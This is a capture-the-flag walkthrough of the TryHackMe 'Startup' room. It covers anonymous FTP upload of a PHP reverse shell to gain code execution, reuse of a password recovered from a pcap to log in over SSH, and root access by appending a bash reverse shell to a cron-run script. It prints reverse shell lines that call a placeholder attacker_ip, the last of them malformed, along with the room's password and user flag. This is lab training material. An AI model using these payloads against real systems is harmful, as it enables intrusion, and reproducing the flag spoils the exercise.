# Startup

Room : https://tryhackme.com/room/startup


## 1. Recon

### Rustscan

```bash
rustscan -a 10.49.183.83
```

Found:

```text
21/tcp
22/tcp
80/tcp
```

### Nmap

```bash
nmap -sC -sV -p21,22,80 10.49.183.83
```

Result:

```text
Anonymous FTP login allowed
```


## 2. FTP Enumeration


Nmap already told us:

```text
ftp-anon: Anonymous FTP login allowed
```

This means Nmap successfully logged in using FTP's built-in anonymous account and was able to list files.

So instead of trying random credentials, we immediately try:

```bash
ftp 10.49.183.83
```

Login:

```text
Username: anonymous
Password: anonymous
```

Download files:

```bash
get important.jpg
get notice.txt
```



# 3. Web Enumeration

Homepage:

```bash
curl http://10.49.183.83
```

Source code:

```html
<!--when are we gonna update this??-->
```

Nothing useful.



### Gobuster

```bash
gobuster dir \
-u http://10.49.183.83 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Found:

```text
/files
```

Interesting because FTP already gave us downloadable files.


## 4. Testing FTP Uploads

Nmap showed:

```text
drwxrwxrwx ftp
```

Meaning the FTP directory is writable.

Create a test file:

```bash
echo hello > test.txt
```

Upload:

```bash
put test.txt
```

Visit:

```text
http://TARGET/files/ftp/test.txt
```

Success.

This means anything uploaded through FTP becomes reachable from Apache.


## 5. Initial Access

Upload a PHP file.

Test:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/1234 0>&1'"); ?>
```

Visit:

```text
/files/ftp/test.php
```

PHP executes.

This gives code execution as the web server user.


## 6. Enumeration as www-data

Check user:

```bash
whoami
```

Output:

```text
www-data
```

Explore filesystem:

```bash
ls /
```

Interesting items:

```text
recipe.txt
incidents/
```

## 7. Investigating incidents

Directory:

```bash
cd /incidents
```

Found:

```text
suspicious.pcapng
```

Check:

```bash
strings suspicious.pcapng
```

Found:

```text
sudo -l
password:
c4ntg3t3n0ughsp1c3
```

and references to:

```text
lennie
```


## 8. SSH as Lennie

Try:

```bash
ssh lennie@TARGET
```

Password:

```text
c4ntg3t3n0ughsp1c3
```

Success.


## 9. User Flag

```bash
cat user.txt
```

Flag:

```text
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```


## 10. Privilege Escalation Enumeration

Check:

```bash
sudo -l
```

Nothing useful.

Check SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Nothing obviously vulnerable.


## 11. Using pspy

`pspy` is a Linux process monitoring tool.

Unlike `ps`:

```bash
ps aux
```

which only shows what's running right now,

`pspy` continuously watches for:

* cron jobs
* scheduled tasks
* short-lived root processes

Many privilege escalations come from:

```text
Root periodically executes something
```

and normal users can modify it.


Transfer:

```bash
python3 -m http.server 8888
```

Download:

```bash
wget http://YOUR_IP:8888/pspy64
chmod +x pspy64
./pspy64
```


pspy showed:

```text
UID=0 /home/lennie/scripts/planner.sh
```

every minute.

This means:

```text
ROOT
   ↓
Runs planner.sh
   ↓
Every minute
```


## 12. Investigating planner.sh

```bash
cat ~/scripts/planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Notice:

```text
planner.sh calls /etc/print.sh
```


## 13. Root Access

Inspect:

```bash
cat /etc/print.sh
```

```bash
#!/bin/bash
echo "Done!"
```

Add own reverse shell command to it.
```
echo "/bin/bash -c 'bash -i >& /dev/attacker_ip/1111 0>&1" >> print.sh
```

Since root executes this script every minute, modifying it affects what root executes.

After waiting for cron to trigger, root-level execution occurs.


Got the root access.

DONE!!!!

